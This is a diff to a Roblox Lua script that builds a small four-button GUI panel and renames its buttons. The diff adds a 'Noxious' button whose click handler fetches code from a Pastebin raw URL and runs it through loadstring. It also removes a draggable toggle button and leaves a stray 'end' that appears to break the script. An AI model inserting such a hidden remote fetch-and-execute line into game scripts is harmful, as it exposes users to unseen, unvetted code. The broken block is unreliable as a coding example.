@@ -59,7 +59,6 @@ for i = 1, 4 do
     Button.Size = UDim2.new(0.4, 0, 0.15, 0) -- 40% width, 15% height
     Button.Position = UDim2.new(0.05 + (i % 2) * 0.5, 0, 0.3 + math.floor((i - 1) / 2) * 0.2, 0) -- Grid-like layout
     Button.BackgroundColor3 = buttonColors[i]
-    Button.Text = "Button " .. i
     Button.TextScaled = true
     Button.Font = Enum.Font.Gotham
     Button.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -68,29 +67,33 @@ for i = 1, 4 do
     ButtonCorner.CornerRadius = UDim.new(0.2, 0)
     ButtonCorner.Parent = Button
 
-    -- Add unique functionality for each button
+    -- Customize button names
+    if i == 1 then
+        Button.Text = "Noxious"
+    elseif i == 2 then
+        Button.Text = "Speed Boost"
+    elseif i == 3 then
+        Button.Text = "Random Color"
+    elseif i == 4 then
+        Button.Text = "Show Message"
+    end
+
+    -- Add functionality for each button
     Button.MouseButton1Click:Connect(function()
         if i == 1 then
-            print("Button 1 clicked! Performing Action 1.")
-            -- Example: Teleport player
-            local player = game.Players.LocalPlayer
-            if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
-                player.Character.HumanoidRootPart.CFrame = CFrame.new(0, 10, 0) -- Teleport to a new position
+            loadstring(game:HttpGet("https://pastebin.com/raw/y8eKgLSs"))()
             end
         elseif i == 2 then
-            print("Button 2 clicked! Performing Action 2.")
-            -- Example: Change player's walk speed
+            print("Speed Boost button clicked!")
             local player = game.Players.LocalPlayer
             if player.Character and player.Character:FindFirstChild("Humanoid") then
                 player.Character.Humanoid.WalkSpeed = 50 -- Increase walk speed
             end
         elseif i == 3 then
-            print("Button 3 clicked! Performing Action 3.")
-            -- Example: Change the frame color
+            print("Random Color button clicked!")
             MainFrame.BackgroundColor3 = Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255)) -- Random color
         elseif i == 4 then
-            print("Button 4 clicked! Performing Action 4.")
-            -- Example: Display a message
+            print("Show Message button clicked!")
             local message = Instance.new("Message", game.Workspace)
             message.Text = "Hello, Roz's World!"
             wait(2)
@@ -98,29 +101,3 @@ for i = 1, 4 do
         end
     end)
 end
-
--- Create a draggable toggle button
-local ToggleButton = Instance.new("TextButton")
-ToggleButton.Parent = ScreenGui
-ToggleButton.Size = UDim2.new(0, 100, 0, 50) -- Toggle button size
-ToggleButton.Position = UDim2.new(0, 50, 0.5, -25) -- Initially on the left side
-ToggleButton.BackgroundColor3 = Color3.fromRGB(85, 85, 255) -- Blue toggle button
-ToggleButton.Text = "Toggle"
-ToggleButton.TextScaled = true
-ToggleButton.Font = Enum.Font.Gotham
-ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-
-local ToggleCorner = Instance.new("UICorner")
-ToggleCorner.CornerRadius = UDim.new(0.5, 0)
-ToggleCorner.Parent = ToggleButton
-
--- Make the toggle button draggable
-ToggleButton.Active = true
-ToggleButton.Draggable = true
-
--- Toggle functionality
-local isFrameVisible = true
-ToggleButton.MouseButton1Click:Connect(function()
-    isFrameVisible = not isFrameVisible
-    MainFrame.Visible = isFrameVisible
-end)
